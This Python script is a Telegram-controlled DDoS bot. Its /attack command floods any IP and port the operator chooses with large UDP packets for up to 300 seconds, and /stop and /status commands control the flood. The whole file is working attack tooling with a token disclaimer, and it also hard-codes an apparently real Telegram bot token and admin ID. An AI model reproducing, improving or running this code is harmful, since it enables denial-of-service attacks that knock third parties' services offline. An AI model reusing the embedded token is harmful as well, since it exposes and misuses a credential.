#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import logging
import threading
import socket
import time
import sys


# Config
BOT_TOKEN = "7390467005:AAHFJ4YAJzATB9YxgSHruQot8G20H7xeX6o"
ADMIN_ID = 6563969315  # Replace with your admin ID @L4DXOP
MAX_DURATION = 300
ATTACK_ACTIVE = False
ATTACK_THREAD = None

bot = telebot.TeleBot(BOT_TOKEN)

def is_admin(user_id):
    return user_id == ADMIN_ID

def ddos_attack(target_ip, target_port, duration):
    global ATTACK_ACTIVE
    start_time = time.time()
    packet_count = 0
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = b"X" * 65000
        
        while ATTACK_ACTIVE and (time.time() - start_time) < duration:
            try:
                sock.sendto(payload, (target_ip, int(target_port)))
                packet_count += 1
            except:
                pass
        
        sock.close()
    except Exception as e:
        print(f"Attack error: {e}")
    
    return packet_count

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    
    if is_admin(user_id):
        response = (
            "🔥 **DDOS ATTACK BOT ACTIVATED** 🔥\n\n"
            "⚡ Commands:\n"
            "`/attack <ip> <port> <seconds>` — Launch attack (max 300s)\n"
            "`/stop` — Terminate active attack\n"
            "`/status` — Check attack status\n\n"
            "🛡️ **ADMIN ONLY** — Only @L4DXOP can execute attacks\n"
            "⏱️ Max duration: 300 seconds per attack\n\n"
            "⚠️ Use responsibly. Unauthorized DDoS is illegal."
        )
        bot.reply_to(message, response, parse_mode="Markdown")
    else:
        bot.reply_to(message, "❌ **UNAUTHORIZED** ❌\n\n"
                    "Only admins can access this bot.\n"
                    "Contact: @L4DXOP", parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    global ATTACK_ACTIVE, ATTACK_THREAD
    
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin access required.", parse_mode="Markdown")
        return
    
    try:
        args = message.text.split()
        if len(args) < 4:
            bot.reply_to(message, "❌ Usage: `/attack <ip> <port> <seconds>`", parse_mode="Markdown")
            return
        
        target_ip = args[1]
        target_port = args[2]
        duration = int(args[3])
        
        if duration > MAX_DURATION:
            bot.reply_to(message, f"❌ Max duration: {MAX_DURATION}s", parse_mode="Markdown")
            return
        
        if ATTACK_ACTIVE:
            bot.reply_to(message, "⚠️ Attack already running. Use `/stop` first.", parse_mode="Markdown")
            return
        
        ATTACK_ACTIVE = True
        ATTACK_THREAD = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration))
        ATTACK_THREAD.start()
        
        response = (
            f"🔴 **ATTACK INITIATED** 🔴\n\n"
            f"🎯 Target: `{target_ip}:{target_port}`\n"
            f"⏱️ Duration: `{duration}s`\n"
            f"🕐 Started: `{datetime.now().strftime('%H:%M:%S')}`\n"
            f"👤 Operator: `@L4DXOP`\n\n"
            f"💥 Packets flooding... Stand by."
        )
        bot.reply_to(message, response, parse_mode="Markdown")
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid parameters. Use: `/attack 192.168.1.1 80 60`", parse_mode="Markdown")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def handle_stop(message):
    global ATTACK_ACTIVE
    
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin access required.", parse_mode="Markdown")
        return
    
    if not ATTACK_ACTIVE:
        bot.reply_to(message, "⚠️ No active attack.", parse_mode="Markdown")
        return
    
    ATTACK_ACTIVE = False
    if ATTACK_THREAD:
        ATTACK_THREAD.join(timeout=5)
    
    response = (
        "🛑 **ATTACK TERMINATED** 🛑\n\n"
        f"⏹️ Stopped: `{datetime.now().strftime('%H:%M:%S')}`\n"
        f"👤 Operator: `@L4DXOP`"
    )
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def handle_status(message):
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.reply_to(message, "❌ Admin access required.", parse_mode="Markdown")
        return
    
    status_text = "🟢 **ACTIVE**" if ATTACK_ACTIVE else "🔴 **IDLE**"
    response = f"{status_text}\n\nBot ready. Use `/attack` to launch."
    
    bot.reply_to(message, response, parse_mode="Markdown")

@bot.message_handler(func=lambda message: True)
def handle_default(message):
    bot.reply_to(message, "🤖 Use `/start` for commands.", parse_mode="Markdown")

if __name__ == "__main__":
    print("[+] Bot running...")
    bot.infinity_polling()